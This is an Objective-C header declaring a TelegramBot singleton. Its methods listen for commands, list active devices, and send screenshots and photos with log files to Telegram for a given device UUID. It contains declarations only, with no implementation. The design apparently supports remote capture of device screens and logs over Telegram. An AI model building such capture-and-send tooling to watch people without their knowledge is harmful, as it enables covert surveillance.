//
//  TelegramBot.h
//  TelegramBot
//
//  Created by Đỗ Thành on 29/12/2024.
//

#import <Foundation/Foundation.h>

@interface TelegramBot : NSObject

+ (instancetype)sharedInstance;
- (void)startListeningForCommands;
- (void)sendScreenshotToTelegramForUUID:(NSString *)uuid;
- (void)listActiveDevices;
- (void)sendPhotoToTelegramWithPath:(NSString *)photoPath logPath:(NSString *)logPath;

@end